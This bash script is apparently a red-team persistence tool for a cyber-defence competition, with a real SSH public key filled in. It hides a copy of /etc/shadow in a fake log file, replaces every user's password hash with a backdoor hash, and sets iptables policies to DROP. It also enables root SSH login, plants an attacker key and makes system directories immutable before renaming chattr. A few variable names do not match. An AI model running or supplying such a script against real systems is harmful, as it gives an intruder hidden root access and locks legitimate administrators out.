# BEFORE RUNNING: 
# 1. set the attackerIP variable to the IP of the attacker machine
# 2. set the allowedPorts variable to the ports that should be allowed for the service
# 3. generate an ssh key on the kali box and copy it out

attackerIP=192.168.1.15
attackerPort=4444
publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtQ2rUqoG7+G3LUYwLCJOar008UlilwucCskQ9i8/8RsVnI3mJ59aWD7HP7yMshK+i6wXjbWDak5NX0KFQvZXLHFp+V5Qp5fD10gFEDaqfhf2CTepeCy50/1TTuCK/Q1EzGgjh3c+yDj1v7POR1uxIXPpnpmu3P9S8tOYDDC2pimmEqjMwq29Gjotlu+BS4ZTjH9dkbFlkoF3resrnyY+BztIAv/KUbQWP70+1xI73tFK9ubzpJi0Dcg3IfwdmEUtI8BbnF4q4/8pIObuzHfxnpe3/FTGp4tibYRsqTxdlckIFAcfI1SgZPnXyzaVDwH4HU4Seh4u+je3mAer5qK1pITLC7dgWt/+cpnLJ/2dXEJowuia8C3YZCJX21gyFPub3doCKqgQ/SmGi8IfDIWfm35YT7mU3862XC3bYrOqzKhvwA0lT69S8s4RtKkPKvWRJphGFwuuSrZOyfIP4Ew1EHScg4CzX4juUc1mU5Tmd7HWOTpBpHpfIn89bNle/eU= emile@EMILE-LT-UBU"
scorebotUser="scorebot"
backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5iUy9iq0VgFxzFafqQezxFhFNBAY0Q0LmAUIUd2uDkm3A/'
allowedInboundPorts=("22" "53" "20")



touch /var/log/boot.log.0
cat /etc/shadow >> boot.log.0



while IFS=: read -r user passwd rest; do
    # Skip lines that are comments or empty
    if [[ "$user" =~ ^#|^$ ]]; then
        continue
    fi
    if [[ "$user" == "$scorebotUser" ]]; then
        echo "Skipping password update for user: $scorebotUser"
        continue
    fi
    # Check if the password hash starts with a $
    if [[ "${passwd:0:1}" == '$' ]]; then
        # Replace the password field with the new hashed password
        sed -i "s#^$user:[^:]*:#$user:$backdoorPassHash:#" /etc/shadow
    fi
done < /etc/shadow





iptables -F 
iptables -X
chains=$(iptables -L | grep Chain | cut  --delimiter=" " --fields=2)
for chain in $chains
do
    iptables --policy $chain DROP
done
for port in "${allowedPorts[@]}"; do
    iptables -A INPUT -p tcp --dport $port -j ACCEPT
done
iptables -A OUTPUT -p icmp -j DROP
iptables-save



# backdoor ssh keys
# generate a key on the attacker box:  ssh-keygen -t rsa -b 4096
# copy the public key to the clipboard: cat ~/.ssh/id_rsa.pub
# paste the public key below as the publicKey variable
sshConfigFile="/etc/ssh/sshd_config"
if grep -q "PermitRootLogin" "$sshConfigFile"; then
    sed -i 's/^#\s*PermitRootLogin.*/PermitRootLogin yes/' $sshConfigFile
else
    echo "PermitRootLogin yes" >> $sshConfigFile
fi
mkdir -p /root/.ssh
touch /root/.ssh/authorized_keys
chown root /root/.ssh
chmod 700 /root/.ssh
chown root /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo $publicKey >> /root/.ssh/authorized_keys
chattr +i /root/.ssh/authorized_keys


# from lockdown.sh
chattr +i /root/.ssh/authorized_keys
chattr +i /etc/passwd
chattr +i /etc/shadow
chattr +i /bin
chattr +i /usr/bin
chattr +i /root
chattr +i /etc
mv /usr/bin/chattr /usr/bin/rttahc
